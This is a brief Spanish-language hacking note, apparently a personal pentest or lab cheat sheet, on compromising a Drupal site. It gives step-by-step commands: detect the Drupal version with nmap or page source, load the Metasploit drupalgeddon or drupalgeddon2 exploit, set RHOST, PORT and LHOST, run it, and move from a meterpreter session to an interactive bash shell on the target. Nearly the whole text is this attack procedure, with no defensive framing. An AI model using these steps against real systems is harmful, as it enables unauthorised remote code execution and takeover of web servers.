Drupal revisar si con el nmap conseguimos la versión de drupal

en la pantalla de inicio viendo el código fuente podemos encontrar la versión. 

atacamos con metasploit msfconsole



search drupal {version}

usaremos el exploit drupalgeddon o drupalgeddon2
show options
RHOST
PORT
LHOST
en RHOST ponemos toda la ruta donde esta el drupal
RUN

meterpreter > shell

bash -i

